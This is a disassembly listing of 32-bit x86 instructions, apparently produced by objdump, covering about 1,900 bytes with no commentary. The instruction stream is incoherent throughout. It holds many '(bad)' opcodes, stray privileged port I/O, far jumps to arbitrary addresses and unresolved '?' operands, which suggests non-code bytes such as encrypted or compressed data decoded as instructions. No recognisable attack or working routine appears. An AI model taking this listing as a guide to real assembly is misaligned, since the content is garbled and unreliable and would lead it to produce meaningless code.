  43d969:	adc    esp,edi
  43d96b:	mov    esp,0xd8986ce3
  43d970:	out    0x5b,al
  43d972:	aaa    
  43d973:	adc    DWORD PTR ds:0xe1a18e54,eax
  43d979:	or     al,ch
  43d97b:	bound  eax,QWORD PTR [eax]
  43d97d:	or     cl,bl
  43d97f:	pop    ebx
  43d980:	aaa    
  43d981:	fsubr  QWORD PTR [eax+0x4e3bb09f]
  43d987:	mov    eax,ds:0xb2969ce3
  43d98c:	pop    eax
  43d98d:	pusha  
  43d98e:	dec    ecx
  43d98f:	dec    ebx
  43d990:	sub    BYTE PTR [ebp-0x640807ce],bh
  43d996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d997:	imul   edx,DWORD PTR ds:0xe051ea31,0xde71b58b
  43d9a1:	or     BYTE PTR [esi],ah
  43d9a3:	aam    0xf6
  43d9a5:	pop    edi
  43d9a6:	jnp    0x43d93f
  43d9a8:	jb     0x43d98f
  43d9aa:	fisubr DWORD PTR [edi]
  43d9ac:	fnstenv [eax+0x595df111]
  43d9b2:	icebp  
  43d9b3:	mov    al,0x65
  43d9b5:	sbb    eax,DWORD PTR [edx]
  43d9b7:	jnp    0x43d9d7
  43d9b9:	jmp    0x43d98b
  43d9bb:	cmp    BYTE PTR [ecx+eiz*2+0x6b],dl
  43d9bf:	js     0x43d9b6
  43d9c1:	(bad)  
  43d9c2:	fidivr DWORD PTR [ebp-0x54]
  43d9c5:	test   DWORD PTR [eax],0xed3bbc8c
  43d9cb:	mov    al,0xe7
  43d9cd:	gs jns 0x43d9ae
  43d9d0:	out    dx,al
  43d9d1:	xchg   edi,eax
  43d9d2:	push   esp
  43d9d3:	mov    eax,ds:0x48d838e2
  43d9d8:	lods   eax,DWORD PTR ds:[esi]
  43d9d9:	sbb    BYTE PTR [eax+ecx*8-0x5e6f5ac9],0xe7
  43d9e1:	cmc    
  43d9e2:	enter  0x71a5,0xfc
  43d9e6:	outs   dx,DWORD PTR ds:[esi]
  43d9e7:	lahf   
  43d9e8:	stos   DWORD PTR es:[edi],eax
  43d9e9:	int3   
  43d9ea:	or     al,0x3e
  43d9ec:	dec    BYTE PTR [edi]
  43d9ee:	in     eax,0xab
  43d9f0:	dec    eax
  43d9f1:	shr    esi,1
  43d9f3:	jle    0x43da3c
  43d9f5:	pop    esi
  43d9f6:	jecxz  0x43da2d
  43d9f8:	lods   al,BYTE PTR ds:[esi]
  43d9f9:	mov    ebp,0x1621a462
  43d9fe:	push   ebx
  43d9ff:	bound  ebp,QWORD PTR [eax]
  43da01:	sbb    al,0x4e
  43da03:	cs aaa 
  43da05:	mov    ah,0xee
  43da07:	scas   eax,DWORD PTR es:[edi]
  43da08:	(bad)  
  43da09:	and    eax,DWORD PTR ds:0xad9183a9
  43da0f:	mov    eax,ds:0x5b4d8461
  43da14:	mov    ds:0xb4618127,al
  43da19:	sub    al,0xee
  43da1b:	xor    al,BYTE PTR [edx+edi*1]
  43da1e:	(bad)  
  43da20:	or     eax,0x3ad96862
  43da25:	xchg   edi,eax
  43da26:	jmp    0x43da79
  43da28:	mov    al,dl
  43da2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43da2b:	scas   al,BYTE PTR es:[edi]
  43da2c:	mov    esi,0x380dc9a8
  43da31:	mov    esi,0x20c0ff5f
  43da36:	pop    ecx
  43da37:	inc    ecx
  43da38:	cmp    BYTE PTR [esi],dl
  43da3a:	out    dx,eax
  43da3b:	(bad)  
  43da3c:	sti    
  43da3d:	sub    al,0x4e
  43da3f:	push   cs
  43da40:	sub    BYTE PTR [ecx-0x1a8ac9a1],ah
  43da46:	sub    edi,DWORD PTR [eax]
  43da48:	js     0x43da98
  43da4a:	out    0x84,eax
  43da4c:	adc    eax,0xfeaa9177
  43da51:	sbb    eax,0x6093981a
  43da56:	inc    edi
  43da57:	addr16 xchg ecx,eax
  43da59:	sbb    DWORD PTR [ebp+0x1f],ecx
  43da5c:	into   
  43da5d:	mov    edx,0x345df9dd
  43da62:	xchg   edi,eax
  43da63:	xor    al,0x64
  43da65:	cmp    DWORD PTR [eax+edi*2-0x2],0x13
  43da6a:	mov    esp,0xb69304a0
  43da6f:	xchg   ebp,eax
  43da70:	push   ds
  43da71:	mov    edi,0xd95ead25
  43da76:	cmp    ah,0x12
  43da79:	jg     0x43da68
  43da7b:	jl     0x43dae3
  43da7d:	pop    esi
  43da7e:	push   es
  43da7f:	hlt    
  43da80:	dec    edx
  43da81:	and    eax,0xb7beb7e5
  43da86:	mov    ebp,0xdcf35e5b
  43da8b:	push   ss
  43da8c:	or     edi,edx
  43da8e:	fst    DWORD PTR [edi+esi*1]
  43da91:	jl     0x43da40
  43da93:	add    al,0xff
  43da95:	push   ds
  43da96:	xchg   BYTE PTR [eax-0x64],bh
  43da99:	mov    al,0xee
  43da9b:	jg     0x43da22
  43da9d:	push   esp
  43da9e:	adc    al,0xc5
  43daa0:	repz popa 
  43daa2:	mov    eax,es:0xd777a3f
  43daa8:	mov    WORD PTR [ecx+edi*2-0x73e9a19f],ss
  43daaf:	inc    ecx
  43dab0:	xchg   BYTE PTR [esi-0x60],al
  43dab3:	adc    BYTE PTR [ebp-0x5a],0x35
  43dab7:	ret    0x9f3e
  43daba:	xor    BYTE PTR [eax-0x3963762d],ch
  43dac0:	xor    dh,BYTE PTR [ecx]
  43dac2:	dec    eax
  43dac3:	shl    DWORD PTR [eax+0x69f5ee90],cl
  43dac9:	pop    ss
  43daca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43dacb:	add    ecx,edx
  43dacd:	sub    eax,0xf2a0d6
  43dad2:	sub    DWORD PTR [ebp-0x7a09edba],ecx
  43dad8:	xor    edi,edi
  43dada:	adc    DWORD PTR [eax+0x7ab2eefc],ebp
  43dae0:	mov    esi,0x2ec20002
  43dae5:	stos   DWORD PTR es:[edi],eax
  43dae6:	xor    al,0x8f
  43dae8:	push   ebx
  43dae9:	cli    
  43daea:	fistp  DWORD PTR [ecx+0x14ee01e9]
  43daf0:	lds    esi,FWORD PTR [edx-0x73a1200a]
  43daf6:	xchg   ecx,eax
  43daf7:	mov    dh,0xfb
  43daf9:	cwde   
  43dafa:	fcom   QWORD PTR [edx+0x2c6b606b]
  43db00:	dec    DWORD PTR [ecx+eiz*2]
  43db03:	ss int3 
  43db05:	and    BYTE PTR [esp+eax*4],ah
  43db08:	jecxz  0x43db6a
  43db0a:	leave  
  43db0b:	lods   eax,DWORD PTR ds:[esi]
  43db0c:	retf   0x5aea
  43db0f:	and    DWORD PTR [esi],esp
  43db11:	pop    edx
  43db12:	mov    ds:0xc31456b,eax
  43db17:	shl    DWORD PTR ds:0x3c61e55a,0x1a
  43db1e:	les    eax,FWORD PTR [ebp-0x77ffe0af]
  43db24:	push   ds
  43db25:	ja     0x43db92
  43db27:	aas    
  43db28:	scas   al,BYTE PTR es:[edi]
  43db29:	rol    BYTE PTR [ebp+0x11],1
  43db2c:	(bad)  
  43db2d:	mov    edx,0xecdaa1a0
  43db32:	aas    
  43db33:	adc    ah,0xe0
  43db36:	push   esi
  43db37:	add    eax,0x483bba5e
  43db3c:	retf   0xd66
  43db3f:	xlat   BYTE PTR ds:[ebx]
  43db40:	xchg   DWORD PTR [eax+0x1f],esp
  43db43:	mov    dl,0x72
  43db45:	rcr    BYTE PTR [ecx-0x1a4f6546],cl
  43db4b:	mov    ds,WORD PTR [esi+0x7c]
  43db4e:	aaa    
  43db4f:	inc    ebp
  43db50:	and    BYTE PTR [ebx+edi*4-0x1d],ch
  43db54:	loop   0x43dbb6
  43db56:	repnz in eax,dx
  43db58:	pusha  
  43db59:	and    BYTE PTR [edx],bl
  43db5b:	(bad)  
  43db5c:	test   al,0x9c
  43db5e:	out    dx,al
  43db5f:	xchg   edx,eax
  43db60:	shl    DWORD PTR [ecx-0x68],1
  43db63:	lds    eax,FWORD PTR [edx-0x21]
  43db66:	jmp    FWORD PTR [edi+0x86e53af]
  43db6c:	and    eax,0x80dae5ad
  43db71:	std    
  43db72:	lock pop edi
  43db74:	retf   0x9668
  43db77:	add    DWORD PTR [edx+0x7a],0x5d87f798
  43db7e:	mov    ch,0x87
  43db80:	push   esi
  43db81:	dec    ebx
  43db82:	pop    ebx
  43db83:	ja     0x43db4a
  43db85:	sar    BYTE PTR [ebp-0x11af8794],0x57
  43db8c:	push   ebp
  43db8d:	rcr    dh,0x68
  43db90:	dec    edx
  43db91:	adc    eax,0x4051a15f
  43db96:	xchg   esi,eax
  43db97:	hlt    
  43db98:	push   esi
  43db99:	cmc    
  43db9a:	xchg   esp,eax
  43db9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43db9c:	push   ebx
  43db9d:	cdq    
  43db9e:	popf   
  43db9f:	loopne 0x43db23
  43dba1:	loopne 0x43dbab
  43dba3:	fstp   DWORD PTR [esi-0x33]
  43dba6:	and    eax,0xe728cefd
  43dbab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dbac:	gs mov ebx,0xa0eadeeb
  43dbb2:	xor    ebx,eax
  43dbb4:	sub    BYTE PTR [ecx+0x6fd5b8ee],dl
  43dbba:	and    BYTE PTR [eax+ebp*2],dh
  43dbbd:	in     eax,dx
  43dbbe:	call   0x59378463
  43dbc3:	or     DWORD PTR [ebp+eax*8-0x79e92d11],0x365ee9f3
  43dbce:	retf   0xd1b5
  43dbd1:	les    esp,FWORD PTR [edi+edi*2+0xd]
  43dbd5:	callw  0x3a2e
  43dbd9:	test   eax,0xca1f224e
  43dbde:	into   
  43dbdf:	adc    esi,esi
  43dbe1:	adc    DWORD PTR [eax+0x2b],0x5e
  43dbe5:	loop   0x43dbf8
  43dbe7:	shl    DWORD PTR [eax+0x27],1
  43dbea:	mov    ds:0xb260be13,al
  43dbef:	mov    ecx,0x101c6c74
  43dbf4:	js     0x43dc5d
  43dbf6:	out    dx,al
  43dbf7:	jle    0x43dc68
  43dbf9:	cs popa 
  43dbfb:	adc    eax,0xa13a7685
  43dc00:	add    al,0xfc
  43dc02:	xor    DWORD PTR [ecx],edi
  43dc04:	ror    cl,cl
  43dc06:	and    ebp,DWORD PTR [edx+0x5e]
  43dc09:	sbb    edx,DWORD PTR [eax+0x27200bd0]
  43dc0f:	xchg   DWORD PTR [ecx+0x466ed660],ecx
  43dc15:	iret   
  43dc16:	ins    BYTE PTR es:[edi],dx
  43dc17:	or     bh,0xec
  43dc1a:	jmp    0x43dc36
  43dc1c:	xor    esi,esi
  43dc1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43dc1f:	push   ds
  43dc20:	mov    ah,0xc8
  43dc22:	ja     0x43dc7b
  43dc24:	lods   al,BYTE PTR ds:[esi]
  43dc25:	pusha  
  43dc26:	sub    dh,BYTE PTR [ecx+0x69c593d4]
  43dc2c:	mov    al,ds:0xc48126dd
  43dc31:	loope  0x43dc07
  43dc33:	mov    al,ds:0xce41df1a
  43dc38:	pop    ebp
  43dc39:	dec    ebp
  43dc3a:	mov    ah,BYTE PTR [ecx+0x7b0f31f0]
  43dc40:	jb     0x43dc77
  43dc42:	push   ss
  43dc43:	mov    edi,0x4616d3c
  43dc48:	xor    eax,0xb651e7e0
  43dc4d:	and    esp,DWORD PTR [eax-0x48]
  43dc50:	jb     0x43dc29
  43dc52:	adc    al,0xa9
  43dc54:	imul   eax,DWORD PTR [edi],0xffffffee
  43dc57:	pop    ebp
  43dc58:	ss mov edi,0xc50d7199
  43dc5e:	out    dx,al
  43dc5f:	push   cs
  43dc60:	mov    al,0x28
  43dc62:	and    DWORD PTR [eax+eax*8+0x3f],ebp
  43dc66:	clc    
  43dc67:	scas   al,BYTE PTR es:[edi]
  43dc68:	int    0x21
  43dc6a:	ss daa 
  43dc6c:	pop    esi
  43dc6d:	lahf   
  43dc6e:	or     BYTE PTR [ecx],dl
  43dc70:	aad    0x6b
  43dc72:	mov    ebp,0x8cfd5ef3
  43dc77:	xchg   edx,eax
  43dc78:	jecxz  0x43dcd1
  43dc7a:	pop    esp
  43dc7b:	push   ss
  43dc7c:	(bad)  
  43dc7d:	pusha  
  43dc7e:	ret    
  43dc7f:	or     ebp,0x35
  43dc82:	push   DWORD PTR [esi]
  43dc84:	push   ecx
  43dc85:	retf   0x5dee
  43dc88:	ins    BYTE PTR es:[edi],dx
  43dc89:	(bad)  
  43dc8a:	ficomp DWORD PTR [ebp+0x7f63d8ec]
  43dc90:	push   es
  43dc91:	jae    0x43dc41
  43dc93:	sub    bl,BYTE PTR es:[ebp+edx*1+0x10]
  43dc98:	mov    ch,0x60
  43dc9a:	mov    al,ds:0xd86c4107
  43dc9f:	(bad)  
  43dca0:	push   ebx
  43dca1:	ror    DWORD PTR [edi-0x6f],1
  43dca4:	cmp    BYTE PTR [ecx+0x3d],ah
  43dca7:	test   al,0x20
  43dca9:	add    ebp,DWORD PTR [eax*4+0x26a660ee]
  43dcb0:	cdq    
  43dcb1:	xor    al,0xe6
  43dcb3:	dec    edx
  43dcb4:	fmul   st,st(1)
  43dcb6:	out    dx,al
  43dcb7:	mov    cl,0xa
  43dcb9:	outs   dx,BYTE PTR ds:[esi]
  43dcba:	inc    eax
  43dcbb:	out    0xb9,eax
  43dcbd:	and    DWORD PTR [edx-0x5f],esi
  43dcc0:	pushf  
  43dcc1:	aas    
  43dcc2:	in     al,dx
  43dcc3:	sahf   
  43dcc4:	popa   
  43dcc5:	vrsqrtss xmm6,xmm5,xmm4
  43dcc9:	repnz out dx,al
  43dccb:	int    0x89
  43dccd:	lahf   
  43dcce:	inc    ebp
  43dccf:	pop    ss
  43dcd0:	cmp    ah,BYTE PTR [esi-0x25a6729c]
  43dcd6:	adc    al,0xf1
  43dcd8:	mov    ds:0x5e6cffd3,al
  43dcdd:	jg     0x43dd0e
  43dcdf:	dec    esp
  43dce0:	scas   al,BYTE PTR es:[edi]
  43dce1:	stos   BYTE PTR es:[edi],al
  43dce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43dce3:	mov    ?,WORD PTR [ecx+eiz*2]
  43dce6:	mov    ebp,0x8dfd9895
  43dceb:	stc    
  43dcec:	jmp    0xffd1:0xe06bed87
  43dcf3:	aas    
  43dcf4:	fwait
  43dcf5:	adc    al,0x62
  43dcf7:	or     al,0xa
  43dcf9:	push   ebx
  43dcfa:	xor    al,0x9e
  43dcfc:	xor    BYTE PTR [edx+0x6e26c7ae],0xe1
  43dd03:	and    ecx,DWORD PTR [ebx+ecx*2-0x25]
  43dd07:	add    al,0xb2
  43dd09:	js     0x43dceb
  43dd0b:	add    ch,bh
  43dd0d:	jle    0x43dd44
  43dd0f:	call   0x1f9e:0x3ee043a
  43dd16:	or     esp,DWORD PTR [ebp+0x4b]
  43dd19:	stc    
  43dd1a:	call   0xe0ab:0x678e72aa
  43dd21:	add    BYTE PTR [ecx+0x11],0x95
  43dd25:	pop    edi
  43dd26:	cmp    eax,0xcbd65e4c
  43dd2b:	aas    
  43dd2c:	jg     0x43dd54
  43dd2e:	outs   dx,BYTE PTR ds:[esi]
  43dd2f:	int3   
  43dd30:	jb     0x43dd8f
  43dd32:	imul   esi,DWORD PTR [ecx+0x67],0xffffffa6
  43dd36:	push   cs
  43dd37:	aad    0x8e
  43dd39:	stc    
  43dd3a:	jnp    0x43dcc4
  43dd3c:	push   ebx
  43dd3d:	jae    0x43dd31
  43dd3f:	sbb    BYTE PTR [esi+0x10ca8252],0x0
  43dd46:	nop
  43dd47:	mov    eax,ds:0x160130ad
  43dd4c:	stos   DWORD PTR es:[edi],eax
  43dd4d:	sti    
  43dd4e:	inc    eax
  43dd4f:	out    0x5e,al
  43dd51:	cmp    BYTE PTR [ecx],0x45
  43dd54:	imul   edx,DWORD PTR [ebp+0x556a00d5],0x9dd53be9
  43dd5e:	xlat   BYTE PTR ds:[ebx]
  43dd5f:	and    BYTE PTR [eax],bl
  43dd61:	stos   BYTE PTR es:[edi],al
  43dd62:	pushf  
  43dd63:	add    al,0x1b
  43dd65:	sub    esi,DWORD PTR [edx-0x111e5653]
  43dd6b:	outs   dx,DWORD PTR ds:[esi]
  43dd6c:	dec    ecx
  43dd6d:	fwait
  43dd6e:	fs push edx
  43dd70:	stc    
  43dd71:	adc    bh,al
  43dd73:	inc    ebp
  43dd74:	xchg   edx,eax
  43dd75:	shr    BYTE PTR [esi-0x4195d0c8],0x2a
  43dd7c:	imul   ebx,DWORD PTR [edi+0x45],0xe4de7966
  43dd83:	add    ebp,DWORD PTR [eax]
  43dd85:	mov    ecx,0xb45e9430
  43dd8a:	repz out dx,al
  43dd8c:	push   esp
  43dd8d:	add    BYTE PTR [eax+0x0],dh
  43dd90:	scas   eax,DWORD PTR es:[edi]
  43dd91:	pusha  
  43dd92:	mov    esi,DWORD PTR [esi-0x6aec1ae6]
  43dd98:	inc    esp
  43dd99:	mov    esp,0x7787dcee
  43dd9e:	nop    esi
  43dda1:	mov    edx,0x6b1ec682
  43dda6:	mov    edx,0xfa075e9a
  43ddab:	and    eax,0xa0b619f8
  43ddb0:	jmp    FWORD PTR [eax+esi*8+0x75]
  43ddb4:	pop    ebx
  43ddb5:	push   esp
  43ddb6:	mov    bh,dh
  43ddb8:	pusha  
  43ddb9:	adc    esi,0x4d89813
  43ddbf:	popa   
  43ddc0:	mov    ecx,DWORD PTR [ebx-0x29bb5f55]
  43ddc6:	lds    eax,FWORD PTR [edi-0x78]
  43ddc9:	jge    0x43de17
  43ddcb:	pop    edi
  43ddcc:	pop    ebx
  43ddcd:	stos   BYTE PTR es:[edi],al
  43ddce:	xchg   edx,eax
  43ddcf:	scas   eax,DWORD PTR es:[edi]
  43ddd0:	leave  
  43ddd1:	fs push cs
  43ddd3:	xor    al,0x51
  43ddd5:	sub    DWORD PTR [edx-0x66],0x9cc3245d
  43dddc:	pop    esi
  43dddd:	test   bl,dh
  43dddf:	push   esi
  43dde0:	sbb    BYTE PTR [esi+ebp*8-0x221c0dc7],dl
  43dde7:	mov    DWORD PTR gs:[ebx-0x1c],ebx
  43ddeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ddec:	pop    ebx
  43dded:	push   ss
  43ddee:	inc    ebp
  43ddef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ddf0:	imul   DWORD PTR [edi-0x4afb048f]
  43ddf6:	(bad)  
  43ddf7:	pop    edi
  43ddf8:	dec    edi
  43ddf9:	mov    eax,ds:0x825e9eb9
  43ddfe:	je     0x43de5d
  43de00:	out    0xe,al
  43de02:	mov    dh,0xa0
  43de04:	dec    ebp
  43de05:	aaa    
  43de06:	dec    eax
  43de07:	xor    dl,BYTE PTR [ecx+0x7]
  43de0a:	jo     0x43ddc3
  43de0c:	pop    esi
  43de0d:	mov    edx,DWORD PTR [ebx-0x37]
  43de10:	bound  esp,QWORD PTR [eax+0x2c67d216]
  43de16:	add    al,0xac
  43de18:	(bad)  
  43de19:	xor    al,dh
  43de1b:	scas   al,BYTE PTR es:[edi]
  43de1c:	int    0x3d
  43de1e:	into   
  43de1f:	sub    BYTE PTR [eax+0x2251563f],ch
  43de25:	jge    0x43de1b
  43de27:	mov    al,ds:0xec199205
  43de2c:	scas   eax,DWORD PTR es:[edi]
  43de2d:	or     al,0xcc
  43de2f:	mov    al,ds:0xfd79e9e8
  43de34:	inc    esp
  43de35:	imul   edx,ebx,0xffffffa9
  43de38:	pop    esi
  43de39:	inc    eax
  43de3a:	daa    
  43de3b:	cmp    DWORD PTR [esi],esi
  43de3d:	xchg   esi,eax
  43de3e:	inc    edi
  43de3f:	mov    al,ds:0x7aba6148
  43de44:	mov    ecx,ebp
  43de46:	adc    DWORD PTR [esi+0x1f],ebp
  43de49:	pop    esi
  43de4a:	out    dx,al
  43de4b:	jmp    0x6cbc:0xac431335
  43de52:	repz mov al,ds:0xd1f214bf
  43de58:	mov    ch,al
  43de5a:	test   al,0x77
  43de5c:	xor    cl,BYTE PTR ds:0x33f8a10d
  43de62:	mov    ah,0xcd
  43de64:	shrd   esp,edi,cl
  43de67:	mov    al,ds:0x880aeb76
  43de6c:	outs   dx,BYTE PTR ds:[esi]
  43de6d:	xor    al,0xb8
  43de6f:	xchg   ebp,eax
  43de70:	jmp    0xb177cd29
  43de75:	nop
  43de76:	mov    ds:0xa62dc224,al
  43de7b:	mov    eax,ds:0x77676fc7
  43de80:	xchg   ebx,edi
  43de82:	jae    0x43dee5
  43de84:	pop    esi
  43de85:	push   0x49
  43de87:	lock ror DWORD PTR [eax+0x72],cl
  43de8b:	xchg   edx,eax
  43de8c:	add    dl,BYTE PTR [ebx-0x45]
  43de8f:	dec    esp
  43de90:	popa   
  43de91:	xor    al,0x2f
  43de93:	add    ecx,ebx
  43de95:	lds    ecx,FWORD PTR [ecx+eiz*1-0x18]
  43de99:	iret   
  43de9a:	and    edi,eax
  43de9c:	aaa    
  43de9d:	xchg   DWORD PTR [edx-0x7bb9435f],eax
  43dea3:	jne    0x43deea
  43dea5:	pop    es
  43dea6:	shl    DWORD PTR [eax+0x1e6f2404],1
  43deac:	xchg   edi,eax
  43dead:	std    
  43deae:	gs gs pop esi
  43deb1:	lock cwde 
  43deb3:	dec    ebx
  43deb4:	adc    BYTE PTR [edx-0x61],ah
  43deb7:	sub    DWORD PTR [ecx+0x42],0x17
  43debb:	repnz scas al,BYTE PTR es:[edi]
  43debd:	loopne 0x43df29
  43debf:	leave  
  43dec0:	ret    0xde80
  43dec3:	(bad)  
  43dec4:	pop    esi
  43dec5:	imul   edx,ebx,0xb10670da
  43decb:	mov    bl,0x7c
  43decd:	mov    al,gs:0xd0ad5e8f
  43ded3:	mov    ds:0x910a490e,al
  43ded8:	pop    esi
  43ded9:	imul   esp,DWORD PTR [esi+0x4f8a9cbd],0x3252cb05
  43dee3:	ins    DWORD PTR es:[edi],dx
  43dee4:	jo     0x43de89
  43dee6:	scas   al,BYTE PTR es:[edi]
  43dee7:	loop   0x43deb6
  43dee9:	inc    ebx
  43deea:	sub    DWORD PTR [ebp+0x5e65795d],eax
  43def0:	sub    DWORD PTR [esi*2-0x5d7770e0],esi
  43def7:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  43def9:	jp     0x43deab
  43defb:	and    eax,0xe0f154c6
  43df00:	push   0xffffffea
  43df02:	out    dx,al
  43df03:	das    
  43df04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43df05:	enter  0x11e,0xa7
  43df09:	and    al,0xdf
  43df0b:	mov    al,ds:0xc9215e73
  43df10:	stos   DWORD PTR es:[edi],eax
  43df11:	dec    eax
  43df12:	adc    BYTE PTR [edx-0x383fafa3],ch
  43df18:	(bad)  
  43df1a:	(bad)  
  43df1b:	lahf   
  43df1c:	(bad)  
  43df1d:	jb     0x43df0b
  43df1f:	enter  0xc0e6,0xee
  43df23:	div    DWORD PTR [esp-0x28d3f77]
  43df2a:	fistp  WORD PTR [edx]
  43df2c:	pop    esi
  43df2d:	in     al,dx
  43df2e:	loope  0x43dfa1
  43df30:	mov    DWORD PTR [ebp+0x37],edx
  43df33:	movlps xmm4,QWORD PTR [ecx-0x2c]
  43df37:	add    eax,0xb8f266db
  43df3c:	ins    BYTE PTR es:[edi],dx
  43df3d:	retf   
  43df3e:	out    dx,al
  43df3f:	sub    al,BYTE PTR [esi]
  43df41:	jg     0x43df3a
  43df43:	shl    BYTE PTR [ecx+0x72f3bd1b],1
  43df49:	sbb    BYTE PTR [ebx-0x3af9fe7],dl
  43df4f:	fist   WORD PTR [ecx]
  43df51:	push   esp
  43df52:	sub    eax,0xf38554dc
  43df57:	inc    ebp
  43df58:	pop    esi
  43df59:	cmp    al,0xfe
  43df5b:	(bad)  
  43df5c:	or     DWORD PTR [eax+0x60b874c6],esp
  43df62:	inc    ebp
  43df63:	sbb    BYTE PTR [edx-0x6f],dh
  43df66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43df67:	sbb    eax,edx
  43df69:	pop    esi
  43df6a:	add    dl,al
  43df6c:	sbb    edi,esi
  43df6e:	daa    
  43df6f:	push   cs
  43df70:	push   ss
  43df71:	rol    BYTE PTR es:[eax-0x6fde758c],0x63
  43df79:	popa   
  43df7a:	cmp    eax,0x99de022b
  43df7f:	dec    edi
  43df80:	add    DWORD PTR [eax-0x3bb21712],eax
  43df86:	fs ja  0x43df64
  43df89:	aam    0x60
  43df8b:	mov    eax,ds:0x90a31049
  43df90:	mov    esp,0x5e524a7c
  43df95:	fstp   TBYTE PTR [ebp-0x7a]
  43df98:	inc    edi
  43df99:	icebp  
  43df9a:	jo     0x43df83
  43df9c:	inc    esi
  43df9d:	push   ebx
  43df9e:	stos   BYTE PTR es:[edi],al
  43df9f:	cmp    esi,ecx
  43dfa1:	ret    
  43dfa2:	mov    fs,WORD PTR [edi+0x6f]
  43dfa5:	mov    dl,0x51
  43dfa7:	sbb    dl,BYTE PTR [ebx+0x1c]
  43dfaa:	gs pop si
  43dfad:	iret   
  43dfae:	mov    eax,0xfe46640e
  43dfb3:	stos   BYTE PTR es:[edi],al
  43dfb4:	iret   
  43dfb5:	mov    ebp,0x1d10946e
  43dfba:	ror    BYTE PTR [edi-0x14118971],cl
  43dfc0:	int    0x2a
  43dfc2:	adc    ch,BYTE PTR [eax-0x72cb6eb9]
  43dfc8:	(bad)  
  43dfc9:	dec    ebx
  43dfca:	and    BYTE PTR [ecx],ah
  43dfcc:	aaa    
  43dfcd:	dec    esi
  43dfce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43dfcf:	in     eax,0x90
  43dfd1:	adc    ebp,esi
  43dfd3:	dec    esp
  43dfd4:	xchg   ecx,eax
  43dfd5:	daa    
  43dfd6:	mov    WORD PTR [ebx-0x57aabf45],?
  43dfdc:	pop    es
  43dfdd:	push   es
  43dfde:	(bad)  
  43dfdf:	fwait
  43dfe0:	or     eax,0x59e531f1
  43dfe5:	js     0x43dfd5
  43dfe7:	mov    eax,0xa1f8ab2c
  43dfec:	jp     0x43dfa6
  43dfee:	fwait
  43dfef:	in     al,dx
  43dff0:	sub    DWORD PTR [edi-0xc],ebx
  43dff3:	(bad)  
  43dff4:	cld    
  43dff5:	inc    ecx
  43dff6:	cmp    al,0xdd
  43dff8:	sahf   
  43dff9:	xchg   ebp,eax
  43dffa:	es mov ch,0x5e
  43dffd:	and    DWORD PTR [ecx],0xffffff89
  43e000:	dec    ebp
  43e001:	mov    dl,0x56
  43e003:	fld    DWORD PTR [eax+0x5e]
  43e006:	jns    0x43df93
  43e008:	add    BYTE PTR [ecx-0x50],dh
  43e00b:	mov    eax,DWORD PTR [ebx+0x42321720]
  43e011:	pop    ss
  43e012:	out    dx,al
  43e013:	jl     0x43e00f
  43e015:	into   
  43e016:	adc    al,0xe5
  43e018:	mov    ch,0x6d
  43e01a:	push   edi
  43e01b:	mov    al,ds:0xad69c0e1
  43e020:	fisub  WORD PTR [ebx]
  43e022:	sub    BYTE PTR [edx+0x39],bh
  43e025:	fucomip st,st(6)
  43e027:	add    BYTE PTR [esp+edx*1-0x6fca3b92],al
  43e02e:	jecxz  0x43dfd0
  43e030:	idiv   BYTE PTR [ebp-0x15750f66]
  43e036:	imul   edi,DWORD PTR [edx+0x63],0x1d66a22f
  43e03d:	and    ebx,edx
  43e03f:	(bad)  
  43e040:	jae    0x43e095
  43e042:	lds    esp,FWORD PTR [eax+0x1af4491a]
  43e048:	(bad)  
  43e04a:	jmp    0x36ac:0xff5db64f
  43e051:	jno    0x43e0c1
  43e053:	xchg   ebx,eax
  43e054:	rol    edx,0x9f
  43e057:	cs lock pusha 
  43e05a:	addr16 loopne 0x43e04e
  43e05d:	cmp    dh,bh
  43e05f:	pop    esp
  43e060:	cmp    al,dl
  43e062:	add    BYTE PTR [edx+ebx*2],ch
  43e065:	fld    TBYTE PTR [esi+0x33c45300]
  43e06b:	out    0xfa,al
  43e06d:	pusha  
  43e06e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e06f:	dec    edi
  43e070:	fiadd  DWORD PTR [edi+0x2b]
  43e073:	cmp    esi,DWORD PTR [edx]
  43e075:	mov    edi,0x33df5cee
  43e07a:	mov    ds:0xfa752722,eax
  43e07f:	out    dx,eax
  43e080:	adc    eax,0x8dcc5061
  43e085:	sti    
  43e086:	mov    esp,0xee279c28
  43e08b:	out    dx,eax
  43e08c:	fild   QWORD PTR [eax-0x4b]
  43e08f:	adc    dh,dl
  43e091:	dec    BYTE PTR [esp+ebp*4+0x15]
  43e095:	push   0x29308c6b
  43e09a:	sub    ch,BYTE PTR [eax]
  43e09c:	mov    dh,0x86
  43e09e:	fadd   DWORD PTR [ebx+0x5b]
  43e0a1:	xchg   esp,eax
  43e0a2:	adc    BYTE PTR ds:0x81604c74,ah
  43e0a8:	mov    es,WORD PTR [esi]
  43e0aa:	jmp    0x43e06c
  43e0ac:	out    0x60,al
  43e0ae:	sub    BYTE PTR [edi-0x5a074e6d],0x70
  43e0b5:	retf   0xa8ee
  43e0b8:	mov    edx,0x5bea4864
  43e0bd:	adc    DWORD PTR [esi-0x4abd305e],0x58
  43e0c4:	lahf   
  43e0c5:	les    esi,FWORD PTR [eax-0x117a8e9c]
  43e0cb:	adc    dl,bl
  43e0cd:	(bad)  
  43e0ce:	clc    
  43e0cf:	data16 adc al,0x94
  43e0d2:	lahf   
  43e0d3:	mov    eax,ds:0x16a49a00
  43e0d8:	stc    
  43e0d9:	cmp    DWORD PTR [ebx],ecx
  43e0db:	fucomp st(7)
  43e0dd:	and    eax,0x441723ee
  43e0e2:	dec    edx
  43e0e3:	mov    bl,0x56
  43e0e5:	call   0xfeb56e27
  43e0ea:	xor    ah,BYTE PTR [ecx-0x6f]
  43e0ed:	cmp    BYTE PTR [esi],dl
  43e0ef:	inc    esp
